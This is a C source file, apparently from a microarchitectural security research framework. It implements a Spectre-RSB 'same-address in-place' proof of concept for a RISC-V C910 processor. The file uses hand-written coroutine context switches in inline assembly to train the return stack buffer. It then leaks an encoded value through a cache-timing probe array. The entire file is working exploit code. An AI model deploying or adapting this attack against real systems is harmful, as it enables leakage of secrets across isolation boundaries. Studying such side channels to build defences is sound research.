#include <stddef.h>
size_t CACHE_MISS = 0;
#include "../../../exploit_framework.h"

// RSB sa-ip via userspace coroutines. Uses jr t2 (x7) for context switch,
// which C910 does not classify as preturn (only x1/x5): zero RSB impact.

#define TRAIN_VALUE 0x01
uint8_t* probe_array;

static void* coro_resume[2]; // [0]=victim, [1]=attacker
static void* coro_stack[2];

// Save callee-saved regs + sp + resume PC, load other side's, jr t2.
// Memory operands loaded before sp modification (they may be sp-relative).
#define CORO_SWITCH(from, to) do { \
    void* _ssp = &coro_stack[from]; \
    void* _spc = &coro_resume[from]; \
    void* _lsp = &coro_stack[to]; \
    void* _lpc = &coro_resume[to]; \
    asm volatile( \
        "ld a0, %[ssp]\n\t"   \
        "ld a1, %[spc]\n\t"   \
        "ld a2, %[lsp]\n\t"   \
        "ld a3, %[lpc]\n\t"   \
        "addi sp, sp, -112\n\t" \
        "sd ra,   0(sp)\n\t"   \
        "sd s0,   8(sp)\n\t"   \
        "sd s1,  16(sp)\n\t"   \
        "sd s2,  24(sp)\n\t"   \
        "sd s3,  32(sp)\n\t"   \
        "sd s4,  40(sp)\n\t"   \
        "sd s5,  48(sp)\n\t"   \
        "sd s6,  56(sp)\n\t"   \
        "sd s7,  64(sp)\n\t"   \
        "sd s8,  72(sp)\n\t"   \
        "sd s9,  80(sp)\n\t"   \
        "sd s10, 88(sp)\n\t"   \
        "sd s11, 96(sp)\n\t"   \
        "sd gp, 104(sp)\n\t"   \
        "sd sp, 0(a0)\n\t"    \
        "la t2, 1f\n\t"        \
        "sd t2, 0(a1)\n\t"    \
        "ld sp, 0(a2)\n\t"    \
        "ld t2, 0(a3)\n\t"    \
        "jr t2\n\t"            \
    "1:\n\t"                   \
        "ld ra,   0(sp)\n\t"   \
        "ld s0,   8(sp)\n\t"   \
        "ld s1,  16(sp)\n\t"   \
        "ld s2,  24(sp)\n\t"   \
        "ld s3,  32(sp)\n\t"   \
        "ld s4,  40(sp)\n\t"   \
        "ld s5,  48(sp)\n\t"   \
        "ld s6,  56(sp)\n\t"   \
        "ld s7,  64(sp)\n\t"   \
        "ld s8,  72(sp)\n\t"   \
        "ld s9,  80(sp)\n\t"   \
        "ld s10, 88(sp)\n\t"   \
        "ld s11, 96(sp)\n\t"   \
        "ld gp, 104(sp)\n\t"   \
        "addi sp, sp, 112\n\t" \
        :                       \
        : [ssp] "m"(_ssp), [spc] "m"(_spc), \
          [lsp] "m"(_lsp), [lpc] "m"(_lpc)  \
        : "a0", "a1", "a2", "a3", "a4", "a5", "a6", "a7", \
          "t0", "t1", "t2", "t3", "t4", "t5", "t6", "memory" \
    ); \
} while(0)

static volatile int caller_is_victim = 0;

void __attribute__((noinline)) in_place() {
    if (caller_is_victim)
        CORO_SWITCH(0, 1);
    else
        CORO_SWITCH(1, 0);
}

#define ATTACKER_STACK_SIZE (64 * 1024)
static char attacker_stack_mem[ATTACKER_STACK_SIZE] __attribute__((aligned(16)));

__attribute__((noreturn))
static void attacker_main(void) {
    CORO_SWITCH(1, 0); // yield back to complete bootstrap

    while (1) {
        asm volatile("mv s1, %0" : : "r"(probe_array + TRAIN_VALUE * PAGE_SIZE) : "s1");
        caller_is_victim = 0;
        in_place();

        void* target;
        asm volatile("mv %0, s1" : "=r"(target));
        SPEC_FENCE();
        maccess(target);

        CORO_SWITCH(1, 0);
    }
}

void rsb_sa_ip_setup(exploit_ctx_t* ctx, void* data) {
    ctx->exclude_enabled = true;
    ctx->exclude_value = TRAIN_VALUE;

    // Bootstrap attacker on its own stack with a fake CORO_SWITCH frame
    void* stack_top = attacker_stack_mem + ATTACKER_STACK_SIZE;
    uint64_t* frame = (uint64_t*)((uintptr_t)stack_top - 112);
    __builtin_memset(frame, 0, 112);
    asm volatile("sd gp, %0" : "=m"(frame[13])); // frame[13] = gp

    coro_stack[1] = (void*)frame;
    coro_resume[1] = (void*)attacker_main;
    CORO_SWITCH(0, 1);
    printf("  Bootstrap complete\n");
}

void rsb_attack(exploit_ctx_t* ctx, void* data, uint8_t encode_index) {
    for (int rep = 0; rep < 10; rep++) {
        asm volatile("mv s1, %0" : : "r"(probe_array + encode_index * PAGE_SIZE) : "s1");
        caller_is_victim = 1;
        in_place();
    }
}

int main() {
    exploit_ctx_t ctx = {0};
    if (exploit_init(&ctx) != 0) return 1;
    probe_array = ctx.probe_array;

    printf("Spectre-RSB sa-ip (coroutine)\n");
    exploit_hooks_t hooks = {
        .setup = rsb_sa_ip_setup,
        .cleanup = NULL,
        .attack = rsb_attack,
    };
    exploit_run(&ctx, &hooks, NULL);
    exploit_print_results("RSB same-address in-place", &ctx);
    exploit_cleanup(&ctx);
    return 0;
}
